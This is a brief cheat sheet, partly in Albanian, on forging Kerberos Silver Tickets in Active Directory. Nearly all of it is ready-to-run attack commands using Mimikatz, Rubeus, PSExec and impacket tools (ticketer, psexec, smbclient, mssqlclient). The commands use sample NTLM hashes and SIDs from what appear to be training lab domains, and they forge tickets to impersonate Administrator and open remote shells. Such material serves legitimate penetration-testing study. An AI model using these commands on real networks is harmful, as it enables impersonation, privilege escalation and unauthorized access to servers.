
- ✔️ **Service account NTLM hash** _(ky është thelbësor)_
- ✔️ **Domain SID**
- ✔️ **Username për t’u impersonuar** (p.sh. Administrator)
- ✔️ **SPN / Service target** (p.sh. `cifs/server`, `http/web`, `mssqlsvc/db`)


```bash
# Getting the Domain SID
Import-Module .\PowerView.ps1
Get-DomainSID

# Using Mimikatz to Create a Silver Ticket
mimikatz.exe
mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ptt

# Reviewing the Tickets with klist
klist

# Displaying Directory Information with dir
dir //sql01.inlanefreight.local/c$

# Create a Silver Ticket
mimikatz.exe "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ticket:sql01.kirbi" exit

# Create a Sacrificial Process
Rubeus.exe createnetonly /program:cmd.exe /show

# Import the Ticket in the New cmd.exe Process
Rubeus.exe ptt /ticket:sql01.kirbi

# Using the New cmd.exe Process with PSExec
PSExec.exe -accepteula \\sql01.inlanefreight.local cmd

```

---

## Silver Ticket from Linux 


```bash
# Retrieve the Domain's SID
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids

# Retrvie Domain SID
python3 getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson

# Create a Silver Ticket with ticketer.py
ticketer.py -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator

# Create Silver Ticket
python3 ticketer.py -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local

# Importing the Ticket and using it
export KRB5CCNAME=./Administrator.ccache
smbclient.py -k -no-pass sql01.inlanefreight.local

# Using PSExec to get a Remote Shell
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass sql01.inlanefreight.local


# Log in to a service after get Ticket
KRB5CCNAME='/home/kali/Desktop/Administrator.ccache' python3 examples/mssqlclient.py -k -no-pass dc1.scrm.local
```
